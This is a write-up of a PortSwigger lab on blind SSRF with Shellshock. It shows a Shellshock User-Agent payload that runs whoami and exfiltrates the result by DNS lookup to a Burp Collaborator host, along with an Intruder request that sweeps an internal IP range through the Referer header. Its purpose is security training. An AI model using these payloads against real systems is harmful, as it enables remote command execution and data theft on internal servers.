# [Lab: Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

## Lab

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

## Scan

Burpsuite `collaborator everywhere` extension detected:

- `Collaborator Pingback (HTTP): Referer` at `/product`
- `Collaborator Pingback (HTTP): User-Agent` at `/product`

## Shellshock

is a vulnerability in bash which allows remote code execution
without confirmation. A series of random characters, () {:;} ; , confuses the bash
because it does not know what to do with them , so by default it execute the code
after it.

```shell
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

## Solutions

- burp's intruder:
  - positions:

    ```http
    GET /product?productId=1 HTTP/1.1
    User-Agent: () { :; }; /usr/bin/nslookup $(whoami).collaborator
    Referer: http://192.168.0.§§:8080
    ```

  - payloads: 0 -> 255
  - result: `The Collaborator server received a DNS lookup of type A for the domain name peter-kHRxU6.jqdkp06io97juf4kag3dur3tckib66uv.oastify.com.`

- submit: `peter-kHRxU6`
  
## References

shellshock: <https://www.safe.security/assets/img/research-paper/pdf/Blind%20SSRF.pdf>
